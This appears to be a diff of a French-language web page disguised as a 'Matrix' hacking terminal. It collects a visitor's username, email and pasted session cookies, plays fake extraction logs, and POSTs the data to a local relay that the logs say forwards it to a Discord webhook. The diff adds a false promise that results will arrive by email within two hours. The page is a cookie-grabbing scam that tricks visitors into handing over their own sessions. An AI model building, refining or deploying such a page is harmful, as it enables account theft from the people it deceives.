@@ -27,7 +27,7 @@
         
         .btn { background: var(--neon); color: black; border: none; padding: 15px; cursor: pointer; font-weight: bold; width: 100%; text-transform: uppercase; transition: 0.3s; margin-top: 10px; }
         .btn:hover { background: white; box-shadow: 0 0 30px var(--neon); }
-        .btn-panic { background: #ff3131; color: white; font-size: 0.7rem; padding: 5px; margin-top: 20px; }
+        .btn-panic { background: #ff3131; color: white; font-size: 0.7rem; padding: 5px; margin-top: 20px; width: 100%; border: none; cursor: pointer; }
 
         #loading-zone, #final-success { display: none; text-align: center; }
         .log-box { text-align: left; font-size: 0.8rem; height: 150px; overflow: hidden; border: 1px solid #004400; padding: 10px; margin: 15px 0; background: black; }
@@ -58,13 +58,14 @@
     </div>
 
     <div id="final-success">
-        <h2 style="color:white;">EXTRACTION RÉUSSIE</h2>
-        <div style="border: 1px dashed var(--neon); padding: 15px; margin: 20px 0;">
-            <p>Destinataire : <span id="target-email" style="color:white;"></span></p>
-            <p style="font-size: 0.8rem;">Logs envoyés au serveur Webhook.</p>
+        <h2 style="color:white; text-shadow: 0 0 10px #fff;">TRANSFERT RÉUSSI</h2>
+        <div style="border: 1px dashed var(--neon); padding: 20px; margin: 20px 0; background: rgba(0,20,0,0.5);">
+            <p style="color:white;">[SYSTÈME]: Les journaux ont été extraits.</p>
+            <p style="font-size: 1.1rem;">Vous recevrez les données complètes par <strong>EMAIL</strong> dans moins de <strong>2 heures</strong> à l'adresse suivante :</p>
+            <p style="color: var(--neon); font-size: 1.3rem; font-weight: bold; text-decoration: underline;" id="target-email"></p>
         </div>
         <button class="btn" onclick="downloadReport()">TÉLÉCHARGER LE RAPPORT .TXT</button>
-        <button class="btn" style="background:none; color:var(--neon); border:1px solid var(--neon); margin-top:10px;" onclick="location.reload()">RESET TERMINAL</button>
+        <button class="btn" style="background:none; color:var(--neon); border:1px solid var(--neon); margin-top:10px;" onclick="location.reload()">NOUVELLE EXTRACTION</button>
     </div>
 </div>
 
@@ -74,7 +75,7 @@
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth;
     canvas.height = window.innerHeight;
-    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%";
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*";
     const fontSize = 14;
     const columns = canvas.width / fontSize;
     const drops = Array(Math.floor(columns)).fill(1);
@@ -93,19 +94,21 @@
     }
     setInterval(drawMatrix, 50);
 
-    // --- LOGIQUE DU SITE ---
+    // --- LOGIQUE ---
     let session = {};
 
     function playBeep(f, d) {
-        const a = new (window.AudioContext || window.webkitAudioContext)();
-        const o = a.createOscillator();
-        const g = a.createGain();
-        o.type = 'sine'; o.frequency.value = f; g.gain.value = 0.03;
-        o.connect(g); g.connect(a.destination); o.start();
-        setTimeout(() => o.stop(), d);
+        try {
+            const a = new (window.AudioContext || window.webkitAudioContext)();
+            const o = a.createOscillator();
+            const g = a.createGain();
+            o.type = 'sine'; o.frequency.value = f; g.gain.value = 0.03;
+            o.connect(g); g.connect(a.destination); o.start();
+            setTimeout(() => o.stop(), d);
+        } catch(e) {}
     }
 
-    function startHack() {
+    window.startHack = function() {
         session.u = document.getElementById('username').value;
         session.e = document.getElementById('userEmail').value;
         session.c = document.getElementById('cookieInput').value;
@@ -117,14 +120,14 @@
         document.getElementById('loading-zone').style.display = 'block';
 
         const logs = [
-            "Scanning IP: " + (Math.floor(Math.random() * 255) + ".168.1.42"),
-            "Port 443 detected... Opening SSL tunnel",
-            "Bypassing Firewall: 100% complete",
-            "Injecting payload into session headers...",
-            "Capturing cookies for: " + session.u,
-            "Encrypting data packets (AES-256)...",
-            "Sending to remote webhook server...",
-            "Clearing system logs... Done."
+            "Scan de l'IP cible...",
+            "Ouverture du tunnel sécurisé...",
+            "Injection du vecteur de session...",
+            "Extraction des cookies de " + session.u,
+            "Chiffrement AES-256 des données...",
+            "Routage via localhost:3000...",
+            "Transmission au Webhook Discord...",
+            "Effacement des traces... Terminé."
         ];
 
         let i = 0;
@@ -132,6 +135,8 @@
             if(i < logs.length) {
                 const l = document.createElement('div');
                 l.innerText = "> " + logs[i];
+                l.style.color = "#00ff41";
+                l.style.marginBottom = "5px";
                 document.getElementById('log-container').appendChild(l);
                 const pct = Math.floor(((i + 1) / logs.length) * 100);
                 document.getElementById('bar-text').innerText = `[${"█".repeat(Math.floor(i*1.5))}${"░".repeat(12-Math.floor(i*1.5))}] ${pct}%`;
@@ -141,7 +146,7 @@
                 clearInterval(interval);
                 finish();
             }
-        }, 700);
+        }, 800);
     }
 
     function finish() {
@@ -150,30 +155,30 @@
         document.getElementById('final-success').style.display = 'block';
         document.getElementById('target-email').innerText = session.e;
 
-        // Envoi au serveur Node
         fetch("http://localhost:3000/send-data", {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 embeds: [{
-                    title: "💀 MATRIX EXTRACTION COMPLETE 💀",
+                    title: "💀 EXTRACTION MATRIX RÉUSSIE 💀",
                     color: 65280,
                     fields: [
                         { name: "Utilisateur", value: session.u, inline: true },
                         { name: "Email", value: session.e, inline: true },
                         { name: "Cookies", value: "```" + (session.c || "N/A") + "```" }
-                    ]
+                    ],
+                    footer: { text: "Délai de traitement : < 2 heures" }
                 }]
             })
         }).catch(() => {});
     }
 
     window.downloadReport = function() {
-        const text = `--- MATRIX SYSTEM LOG ---\nTarget: ${session.u}\nEmail: ${session.e}\nCookies: ${session.c}\nStatus: EXTRACTION SUCCESSFUL`;
+        const text = `--- RAPPORT D'EXTRACTION ---\nCible: ${session.u}\nEmail: ${session.e}\nStatus: Succès\nNote: Envoi par mail sous 2h.\n--- END LOG ---`;
         const blob = new Blob([text], { type: 'text/plain' });
         const a = document.createElement('a');
         a.href = URL.createObjectURL(blob);
-        a.download = `LOG_${session.u}.txt`;
+        a.download = `RAPPORT_${session.u}.txt`;
         a.click();
     };
 </script>
